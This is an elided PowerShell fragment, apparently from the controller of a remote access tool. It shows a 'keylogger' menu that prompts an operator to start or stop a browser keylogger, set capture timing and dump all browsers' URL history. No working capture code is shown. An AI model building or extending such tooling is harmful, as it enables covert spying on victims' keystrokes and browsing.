...
While($Client.Connected)
{
  If(-not ($WaitData))
  {
    ...
    If($Command -ieq "keylogger")
    {
        ...
        If($choise -ieq "Browser")
        {
           Write-Host " - Start or Stop browser keyloger? (start|stop): " -NoNewline
           $Exechoise = Read-Host
           ...
           Else
           {
              Write-Host " - Delay time between each capture (3)    : " -NoNewline
              $Delay = Read-Host
              If($Delay -lt 3)
              {
              ...
              Write-Host " - Schedule capture start time ($StarTimer|now): " -NoNewline
              $StartMe = Read-Host
              ...
              Write-Host " - Dump all browsers url history? (yes|no): " -NoNewline
